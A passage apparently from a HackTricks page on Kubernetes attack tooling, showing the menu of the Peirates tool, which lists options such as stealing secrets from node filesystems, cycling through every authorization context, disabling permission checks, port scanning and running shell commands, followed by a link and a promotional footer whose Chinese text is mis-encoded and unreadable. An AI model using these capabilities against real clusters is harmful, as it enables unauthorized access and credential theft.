-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
